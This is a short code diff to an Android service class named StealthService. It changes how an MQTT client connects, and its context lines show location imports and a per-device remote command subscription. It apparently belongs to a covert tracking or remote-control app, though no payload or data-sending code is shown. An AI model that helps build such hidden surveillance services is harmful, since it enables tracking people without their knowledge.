@@ -5,6 +5,7 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
+import android.content.IntentFilter;
 import android.content.Intent;
 import android.location.Location;
 import android.location.LocationManager;
@@ -155,8 +156,7 @@ public class StealthService extends Service implements MqttCallback {
             
             mqttClient.setCallback(this);
             
-            IMqttToken token = mqttClient.connect(options);
-            token.waitForCompletion(10000);
+            mqttClient.connect(options);
             
             // 订阅命令主题
             mqttClient.subscribe(TOPIC_PREFIX + deviceId + "/command", 1);
@@ -469,3 +469,4 @@ public class StealthService extends Service implements MqttCallback {
         Log.d(TAG, "Service destroyed");
     }
 }
+
